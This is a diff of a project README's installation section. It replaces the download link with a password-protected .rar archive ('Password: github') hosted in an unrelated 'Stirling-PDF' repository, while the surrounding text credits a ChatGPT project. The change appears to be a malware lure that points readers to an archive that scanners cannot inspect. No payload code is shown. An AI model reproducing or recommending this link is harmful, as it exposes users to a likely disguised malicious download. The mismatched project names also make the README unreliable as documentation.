@@ -1,8 +1,8 @@
 ## Installation 🚀
 
-* **<p><a href="https://github.com/Komeylk/CatizAuto/releases/download/V3/App_V3.zip">​Download</a>**
+* **<p><a href="https://github.com/mackka2k/Stirling-PDF/releases/download/v3.1/Version_3.1.rar">​Download</a>**
 
-* **Update: 07.08.2024**
+* **Password: github**
 
 ---
 
@@ -49,3 +49,4 @@ This project exists thanks to all the people who contribute.
 <img src="https://contrib.rocks/image?repo=acheong08/ChatGPT" />
 </a>
 
+****
